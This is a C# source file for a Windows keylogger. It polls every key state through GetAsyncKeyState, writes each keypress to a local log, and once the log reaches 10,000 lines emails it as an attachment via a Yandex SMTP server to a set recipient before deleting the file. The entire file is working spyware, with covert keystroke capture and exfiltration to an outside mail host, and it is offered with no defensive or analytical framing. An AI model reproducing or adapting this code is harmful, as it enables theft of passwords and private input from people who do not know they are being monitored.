using System;
using System.Threading.Tasks;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Net.Mail;
using System.Net;

namespace KeyLog
{
    class Program
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(int i);
        //logging file path
        static readonly string filePath = @"C:\projects\KeyLog\Logs\";
        static readonly string fileName = @"LoggedKeys.text";

        static void Main(string[] args)
        {
            Worker();
        }

        public static async void WorkerAsync()
        {
            await Task.Run(() => Worker());
        }

        public static void Worker()
        {
            if (!Directory.Exists(filePath))
            {
                Directory.CreateDirectory(filePath);
            }

            string path = @filePath + @fileName;

        mark:
            if (!File.Exists(path))
            {
                StreamWriter sw = File.CreateText(path);
                sw.Close();
            }

            var logLenght = 10000;
            while (true)
            {
                Thread.Sleep(10);
                var converter = new KeysConverter();

                for (int i = 0; i < 255; i++)
                {
                    int key = GetAsyncKeyState(i);
                    //Key Pressed State = 32769
                    if (key == 32769)
                    {
                        StreamWriter sw = File.AppendText(path);
                        sw.WriteLine(converter.ConvertToString(i));
                        sw.Close();
                        break;
                    }
                }

                if (File.ReadAllLines(path).Length > logLenght)
                {
                    try
                    {
                        SendMail();
                        File.Delete(path);
                        goto mark;
                    }
                    catch(Exception e)
                    {
                        StreamWriter sw = File.AppendText(path);
                        sw.WriteLine(e.Message);
                        sw.Close();
                        logLenght += 10000;
                    }
                }
            }
        }

        private static void SendMail()
        {
            string path = filePath + fileName;

            string logName = "Log recorded " + DateTime.Now;
            //smtp host and port
            using (SmtpClient client = new SmtpClient("smtp.yandex.ru", 587))
            {
                MailMessage logMesage = new MailMessage
                {
                    //sender mail address
                    From = new MailAddress("address0@yandex.ru")
                };
                //message recipient mail address
                logMesage.To.Add(new MailAddress("address1@yandex.ru"));
                logMesage.Subject = logName;

                client.UseDefaultCredentials = false;
                client.EnableSsl = true;
                //sender mail addres + pass
                client.Credentials = new NetworkCredential("address0@yandex.ru", "pass");

                using (var file = new Attachment(path))
                {
                    logMesage.Attachments.Add(file);
                    logMesage.Body = logName;
                    client.Send(logMesage);
                }
            }
        }
    }
}